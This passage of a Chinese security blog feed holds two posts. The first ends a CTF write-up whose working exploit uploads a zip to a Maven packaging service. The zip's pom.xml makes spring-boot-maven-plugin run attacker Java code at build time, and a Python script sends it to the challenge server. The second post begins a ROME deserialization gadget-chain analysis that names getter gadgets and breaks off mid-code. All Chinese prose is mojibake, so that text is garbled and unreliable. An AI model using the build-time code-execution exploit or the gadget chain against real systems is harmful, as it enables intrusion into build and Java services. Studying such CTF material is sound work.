class="hljs-string">&quot;-Dmaven.test.skip=true&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>)<br>                .directory(projectDir)<br>                .start()<br>                .waitFor();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetDir</span> <span class="hljs-operator">=</span> Paths.get(projectDir.getAbsolutePath(), <span class="hljs-string">&quot;target&quot;</span>).toFile();<br>        <span class="hljs-keyword">if</span> (!targetDir.exists()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;target dir not found&quot;</span>, HttpStatus.NOT_FOUND);<br>        &#125;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetZipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(projectDir, <span class="hljs-string">&quot;target.zip&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(targetZipFile)) &#123;<br>            <span class="hljs-type">ZipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipParameters</span>();<br>            parameters.setSymbolicLinkAction(ZipParameters.SymbolicLinkAction.INCLUDE_LINK_ONLY);<br>            zipFile.addFolder(targetDir);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(Files.readAllBytes(Paths.get(targetZipFile.getAbsolutePath())), HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>net.lingala.zip4j è¿™ä¸ªåŒ…ä¼¼ä¹æ— æ³•zip slip</p><p>æŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net.lingala.zip4j.exception.ZipException: illegal file name that breaks out of the target directory: ../a.txt<br></code></pre></td></tr></table></figure><p>maven.configå¯ä»¥åŠ è½½é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al<br>total 20<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 .<br>drwxrwxrwt 1 root root 4096 Aug  4 04:09 ..<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .mvn<br>-rw-r--r-- 1 root root  859 Aug  4 03:47 pom.xml<br>root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al .mvn/<br>total 12<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 ..<br>-rw-r--r-- 1 root root  165 Aug  4 03:45 maven.config<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå¤§å°é™åˆ¶äº†ï¼Œmaybeæ˜¯è¦è‡ªå·±å†™ä¸€ä¸ªmavenæ’ä»¶è¿‡å»ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.servlet.multipart.max-file-size=128KB<br>spring.servlet.multipart.max-request-size=256KB<br></code></pre></td></tr></table></figure><p>è¿œç¨‹ç¯å¢ƒæœ‰ spring-boot-maven-plugin è¿™ä¸ªæ’ä»¶ï¼Œåˆ©ç”¨è¿™ä¸ªæ’ä»¶å¯ä»¥åœ¨mvn packageæ—¶è¿è¡Œå½“å‰é¡¹ç›®ã€‚</p><p>åç»­å¯ä»¥é€šè¿‡å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥targetç›®å½•æ¥å®ç°å›æ˜¾ã€‚</p><p>poc3.zipï¼š</p><p><img src="/2024/08/11/jqctf-final/image-20240811224655411.png" alt="image-20240811224655411"></p><p>pom.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Add other dependencies as needed --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Spring Boot Plugin --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- &lt;version&gt;3.3.1&lt;/version&gt; --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!-- æŒ‡å®šè¿è¡Œçš„ç›®æ ‡ --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>run<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-comment">&lt;!-- é…ç½®è¯¥æ’ä»¶æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸé˜¶æ®µ --&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>MavenPackerApplication.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MavenPackerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// Example command to execute</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/readflag&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./target/flag.txt&quot;</span>);<br><br>        <span class="hljs-comment">// Execute the command</span><br>        executeCommand(command, outputFile);<br><br>        SpringApplication.run(MavenPackerApplication.class, args);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String command, File outputFile)</span> &#123;<br>        <span class="hljs-comment">// Create a ProcessBuilder with the command</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(command.split(<span class="hljs-string">&quot; &quot;</span>));<br>        <br>        <span class="hljs-comment">// Redirect output to the specified file</span><br>        processBuilder.redirectOutput(outputFile);<br>        processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Start the process</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <br>            <span class="hljs-comment">// Wait for the process to complete</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> process.waitFor();<br>            System.out.println(<span class="hljs-string">&quot;Process exited with code: &quot;</span> + exitCode);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>settings.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>/home/app/.m2/repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>f = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;poc3.zip&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)&#125;<br><br>p = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;<br><br><br>res = requests.post(<span class="hljs-string">&quot;http://30.222.0.20:45807/pack&quot;</span>, files=f, proxies=p)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(res.content)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rome</title>
    <link href="/2024/08/10/Rome/"/>
    <url>/2024/08/10/Rome/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ROME is a Java framework for RSS and Atom feeds</p><p>RSS ï¼š Really Simple Syndicationï¼ˆçœŸæ­£ç®€æ˜“è”åˆï¼‰</p><p>æ˜¯ä¸€ç§æ¶ˆæ¯æ¥æºæ ¼å¼è§„èŒƒï¼Œç”¨ä»¥èšåˆç»å¸¸å‘å¸ƒæ›´æ–°æ•°æ®çš„ç½‘ç«™ï¼Œä¾‹å¦‚åšå®¢æ–‡ç« ã€æ–°é—»ã€éŸ³é¢‘æˆ–è§†é¢‘çš„ç½‘æ‘˜ã€‚å…¶ä½¿ç”¨XMLç¼–å†™</p><p>RSS é˜…è¯»å™¨ç”¨äºè¯»å– RSS feedã€‚ROMEå°±æ˜¯ä¸€ä¸ªRSS é˜…è¯»å™¨çš„å®ç°ã€‚</p><p>Rome æä¾›äº† <strong>ToStringBean</strong> è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œï¼Œè¿™ä¹Ÿæ˜¯é—®æˆ‘ä»¬ç”¨Romeæ‰“ååºåˆ—åŒ–çš„<strong>æ ¸å¿ƒåˆ©ç”¨ç‚¹</strong>ã€‚</p><h2 id="æµ…æ"><a href="#æµ…æ" class="headerlink" title="æµ…æ"></a>æµ…æ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToStringBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123; <span class="hljs-comment">// å®ç°äº†Serializableæ¥å£</span><br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">ToStringBean</span><span class="hljs-params">(Class beanClass)</span> &#123;<br>        _beanClass = beanClass;<br>        _obj = <span class="hljs-built_in">this</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Stack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (Stack) PREFIX_TL.get();<br>        String[] tsInfo = (String[]) ((stack.isEmpty()) ? <span class="hljs-literal">null</span> : stack.peek());<br>        String prefix;<br>        <span class="hljs-keyword">if</span> (tsInfo==<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> _obj.getClass().getName();<br>            prefix = className.substring(className.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prefix = tsInfo[<span class="hljs-number">0</span>];<br>            tsInfo[<span class="hljs-number">1</span>] = prefix;<br>        &#125;<br>        <span class="hljs-keyword">return</span> toString(prefix);<br>    &#125;<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">128</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);<br>            <span class="hljs-keyword">if</span> (pds!=<span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pds.length;i++) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>                    <span class="hljs-keyword">if</span> (pReadMethod!=<span class="hljs-literal">null</span> &amp;&amp;                             <span class="hljs-comment">// ensure it has a getter method</span><br>                        pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="hljs-comment">// filter Object.class getter methods</span><br>                        pReadMethod.getParameterTypes().length==<span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">// filter getter methods that take parameters</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);<br>                        printProperty(sb,prefix+<span class="hljs-string">&quot;.&quot;</span>+pName,value);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            sb.append(<span class="hljs-string">&quot;\n\nEXCEPTION: Could not complete &quot;</span>+_obj.getClass()+<span class="hljs-string">&quot;.toString(): &quot;</span>+ex.getMessage()+<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>toString(String prefix)</code>æœ‰å¯ç–‘çš„<code>pReadMethod.invoke</code></p><p><code>BeanIntrospector.getPropertyDescriptors(_beanClass);</code>èƒ½å¤Ÿè·å–ç±»ä¸­çš„å±æ€§ååŠå…¶getteræ–¹æ³•ï¼ˆgetteréœ€è¦publicï¼‰</p><p>å¯ä»¥æœ¬åœ°è¯•è¯•ï¼š</p><p>æ–°å»ºä¸€ä¸ª<code>Person</code>ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(Person.class);<br><span class="hljs-keyword">if</span> (pds != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pds.length; i++) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>        System.out.println(pReadMethod.getName());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//        getName </span><br><span class="hljs-comment">//        getClass</span><br><span class="hljs-comment">//        getAge</span><br></code></pre></td></tr></table></figure><p>æ¥ç€éå†<code>PropertyDescriptor</code>æ•°ç»„ï¼Œå¯¹äºæ¯ä¸ªgetteræ–¹æ³•ï¼Œè‹¥å…¶ä¸æ˜¯Classç±»çš„getteræ–¹æ³•ï¼ˆä¸€èˆ¬å°±æ˜¯<code>getClass</code>äº†ï¼‰ï¼Œä¸”æ— å‚ï¼Œåˆ™æ‰§è¡Œè¯¥æ–¹æ³•ï¼ˆ<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>ï¼‰</p><p>åœ¨<code>FastJson</code>é‚£èŠ‚æˆ‘ä»¬å°±æ¥è§¦äº†å‡ ä¸ªå¯ä»¥åˆ©ç”¨<code>getter</code>æ–¹æ³•çš„æ¶æ„ç±»</p><ul><li><code>TemplatesImpl#getOutputProperties</code>ï¼ˆfastjsonä¸­éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼‰</li><li><code>JdbcRowSetImpl#getDatabaseMetaData()</code>ï¼ˆjndiæ³¨å…¥ï¼Œéœ€è¦å‡ºç½‘ï¼‰</li><li><code>BasicDataSource#getConnection</code>ï¼ˆBCELç ï¼‰</li></ul><p>ä¸‹é¢ä»¥<code>TemplatesImpl#getOutputProperties</code>ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code 